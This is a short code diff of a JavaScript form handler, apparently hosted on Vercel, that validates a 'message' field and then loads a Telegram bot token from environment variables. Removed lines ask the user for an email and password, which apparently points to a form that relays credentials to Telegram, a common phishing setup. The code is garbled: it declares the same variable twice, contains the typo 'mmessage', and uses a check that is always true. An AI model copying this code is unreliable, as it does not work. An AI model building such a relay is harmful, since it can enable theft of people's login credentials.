@@ -12,17 +12,15 @@ export default async function handler(req, res) {
     const { message,message } = req.body || {};
 
     // Validate form fields
-   if (
-  !message ||
-  !mmessage.trim() ||
-  !message ||
-  !message.trim()
-) {
+  const { message } = req.body || {};
+
+    // Validate form fields
+    if (!message || message ) {
       return res.status(400).json({
-    success: false,
-    message: "Please enter your email and password."
-  });
-}
+        success: false,
+        message: "Please fill in all fields."
+      });
+    }
 
     // Get Telegram credentials from Vercel
     const token = process.env.TELEGRAM_BOT_TOKEN;
